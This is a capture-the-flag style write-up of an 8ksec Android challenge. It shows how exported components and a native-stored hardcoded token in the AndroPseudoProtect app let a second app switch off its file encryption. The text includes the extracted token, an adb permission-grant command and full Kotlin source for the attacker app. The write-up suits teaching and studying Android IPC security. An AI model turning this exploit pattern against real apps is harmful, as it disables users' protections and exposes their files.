---
title: "8ksec - AndroPseudoProtect: Ultimate Device Security"
description: "Exploiting Android IPC vulnerabilities"
date: 2026-03-01T09:00:00Z
cascade:
    showReadingTime: true
tags:
- Mobile Security
- Mobile Exploits
---

# 8ksec - AndroPseudoProtect: Ultimate Device Security

## Exploiting Exported Components and Bypassing Security By Obscurity Mechanisms

The goal of this exercise was to develop an android application that exploits Android's IPC by disabling [AndroPseudoProtect.apk](https://academy.8ksec.io/path-player?courseid=android-application-exploitation-challenges&unit=681aad9d039a0df9de032156Unit)'s security functionality.

My initial thought process was that this would likely involve exploiting improperly exposed components. Specifically, if sensitive components are configured with `exported=true`, an attacker application could potentially access internal functionality via **Inter-Process Communication (IPC)**, manipulate behavior, and bypass security controls. This assumption proved to be correct.

---

### Installing and Running the App

Upon launching the app, the application asks for access to all files.

---

### Static Analysis with Jadx Findings

#### 1. Sensitive app components set to `exported=true`

After decompiling the APK with **Jadx** and looking at the `AndroidManifest.xml` file, I noted that both the `SecurityService` and `SecurityReceiver` were set to `exported=true`.

This is a critical misconfiguration. When an Android component is configured as `exported=true`, it becomes accessible to other applications on the device. In the **AndroPseudoProtect** application, the functionality to secure the files is controlled via explicit intents sent to the `SecurityService`. Therefore, this makes it possible for an attacker to start and stop the security services by creating a malicious application that targets these components directly.

#### 2. Security Through Obscurity

After manual analysis of the `SecurityService` file, I noted that there is a call to `SecurityUtils().getSecurityToken()`. This method retrieves a security token from a native library. The token is then validated whenever `startSecurity()` or `stopSecurity()` is invoked. The design assumption appears to be that storing the token in native code prevents attackers from accessing it.

The token is used by the app to validate whether a caller is authorized to start or stop the security service. An attacker can reverse engineer the native library code to obtain the token, which would enable them to call functions to start and stop the `SecurityService` from their malicious application.

**Extracting the token:**
To validate this assumption, I proceeded with the following steps:

1. Decompiled the APK using **apktool**.
2. Navigated to the `lib/` directory.
3. Located the native `.so` file.
4. I then reverse engineered the library using **Ghidra**.
5. I identified the `getSecurityToken()` function in Ghidra.
6. Extracted the hardcoded token: `8ksec_S3cr3tT0k3n_D0N0tSh4r3`.

I also observed that the native library generates a log message each time the user clicks the **Start Service** or **Stop Service** buttons. These buttons internally invoke the `startSecurity()` and `stopSecurity()` functions. From the code analysis, it is clear that both functions require the security token to be passed as part of the request. The logs captured from the Android emulator confirm that the token is validated whenever these methods are executed. This behavior further verifies that the application relies on the hardcoded native token to authorize starting and stopping the security service.

#### 3. Listening to broadcasts to know when to disable security

Further analysis revealed that the application sends broadcasts whenever the security service is started or stopped. Specifically:

* A broadcast is sent when the security service is started.
* A broadcast is sent when the security service is stopped.

This means that any third-party application installed on the device can register a `BroadcastReceiver` and listen for the `ACTION_SECURITY_STARTED` event whenever the user enables security through the **AndroPseudoProtect** app.

The malicious app can then use the token we obtained above to call `stopSecurity`. From the user’s perspective, security appears to be enabled; however, in reality, it has already been disabled in the background by the malicious application. This demonstrates how unprotected broadcast mechanisms can be abused to monitor application state changes and trigger automated exploitation logic without requiring any direct user interaction.

---

### Data Exfiltration from External Storage

For **AndroPseudoProtect** to work properly, it is granted `READ_EXTERNAL_STORAGE`, `MANAGE_EXTERNAL_STORAGE`, and `WRITE_EXTERNAL_STORAGE` permissions so that the app can encrypt files located in the external storage.

After the malicious app disables the encryption enforced by the **AndroPseudoProtect** app, the attacker can use **adb** to grant the malicious app permission to read from external storage:
`adb shell pm grant com.example.myapplication android.permission.READ_EXTERNAL_STORAGE`
and exfiltrate all the files and data stored there.

---

### Exploit Development

To demonstrate the exploit, I developed a secondary Android application that:

1. Listens for `ACTION_SECURITY_STARTED`.
2. Crafts an explicit intent targeting `SecurityService` and `SecurityReceiver`.
3. Includes the security token recovered from the `.so` file.
4. Invokes `startService()` to stop the protection mechanism.
5. Reads the unencrypted files from External storage and displays them in the malicious app.

Because the target components were exported and lacked caller validation, the exploit application could interact with them as if it were the legitimate app itself. The result is a complete bypass of the application's encryption protection using only Android’s IPC framework.

#### Malicious App Implementation (`MainActivity.kt`)

```kotlin
package com.example.myapplication

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Environment
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Button
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.ui.Modifier
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import coil.compose.AsyncImage
import com.example.myapplication.ui.theme.MyApplicationTheme
import java.io.File


class MainActivity : ComponentActivity() {

    companion object {
        const val TARGET_PACKAGE = "com.eightksec.andropseudoprotect"
        const val RECEIVER_CLASS = "com.eightksec.andropseudoprotect.SecurityReceiver"
        const val SERVICE_CLASS = "com.eightksec.andropseudoprotect.SecurityService"

        const val ACTION_SECURITY_STARTED = "com.eightksec.andropseudoprotect.ACTION_SECURITY_STARTED"
        const val ACTION_STOP_SECURITY = "com.eightksec.andropseudoprotect.STOP_SECURITY"

        const val EXTRA_TOKEN = "security_token"
        const val SECRET_TOKEN = "8ksec_S3cr3tT0k3n_D0N0tSh4r3"
    }

    private val fileList = mutableStateListOf<String>()

    private val securityStartedReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == ACTION_SECURITY_STARTED) {
                sendStopSecurityBroadcast()
            }
        }
    }

    private fun createSecurityIntent(className: String) = Intent(ACTION_STOP_SECURITY).apply {
        component = ComponentName(TARGET_PACKAGE, className)
        putExtra(EXTRA_TOKEN, SECRET_TOKEN)
    }

    private fun sendStopSecurityBroadcast() {
        sendBroadcast(createSecurityIntent(RECEIVER_CLASS))
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Android",
                        files = fileList,
                        modifier = Modifier.padding(innerPadding),
                        onStopSecurityClick = {
                            stopSecurity()
                        },
                        onReadFilesClick = {
                            readDownloadDirectory()
                        }
                    )
                }
            }
        }
    }

    private fun readDownloadDirectory() {
        fileList.clear()
        val downloadFolder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        val files = downloadFolder.listFiles()
        
        if (files != null && files.isNotEmpty()) {
            files.forEach { file ->
                fileList.add(file.absolutePath)
            }
        } else {
            Toast.makeText(this, "Download folder is empty or inaccessible", Toast.LENGTH_SHORT).show()
        }
    }

    private fun stopSecurity() {
        try {
            startService(createSecurityIntent(SERVICE_CLASS))
            sendStopSecurityBroadcast()
            Toast.makeText(this, "Stopping Security Service", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(securityStartedReceiver)
        } catch (e: Exception) {
            Log.i("missing_register", "Receiver not registered")
        }
    }
}

@Composable
fun Greeting(
    name: String,
    files: List<String>,
    modifier: Modifier = Modifier,
    onStopSecurityClick: () -> Unit = {},
    onReadFilesClick: () -> Unit = {}
) {
    Column(modifier = modifier.padding(16.dp)) {
        Text(text = "Hello $name!")
        Button(onClick = onStopSecurityClick, modifier = Modifier.padding(top = 8.dp)) {
            Text("Stop Security")
        }
        Button(onClick = onReadFilesClick, modifier = Modifier.padding(top = 8.dp)) {
            Text("Read Files")
        }
        Text(text = "Files in /Download:", modifier = Modifier.padding(top = 16.dp))
        LazyColumn(modifier = Modifier.fillMaxSize()) {
            items(files) { filePath ->
                Column(modifier = Modifier.padding(vertical = 8.dp)) {
                    if (filePath.lowercase().endsWith(".jpg") || filePath.lowercase().endsWith(".png")) {
                        AsyncImage(
                            model = filePath,
                            contentDescription = "Image",
                            modifier = Modifier.fillMaxWidth().height(200.dp),
                            contentScale = ContentScale.Crop
                        )
                    }
                    Text(text = filePath.substringAfterLast("/"), modifier = Modifier.padding(top = 4.dp))
                }
            }
        }
    }
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    MyApplicationTheme {
        Greeting("Android", emptyList())
    }
}

```

## Resources

Here is the proof of exploit video: https://youtu.be/0gmX6fSeqak

And here is the link to the [exploit apk](https://github.com/Florence-Njeri/MobileSecurityExploitz/blob/master/AndroPsuedoProtect/exploit.apk)

---

### Conclusion

This exercise highlights several important mobile security principles:

* **We should not set sensitive components of our application to `exported=true**`: Any exported component expands your attack surface. If a component does not need to be accessed externally, it should not be exported. If it must be exported, it should be protected with strong custom permissions.
* **Security by Obscurity doesn't make your app secure**: Moving sensitive values to a native library `.so` file does not prevent reverse engineering. Attackers can decompile, disassemble, and analyze native libraries to obtain the hidden app secrets easily using tools like Ghidra.

---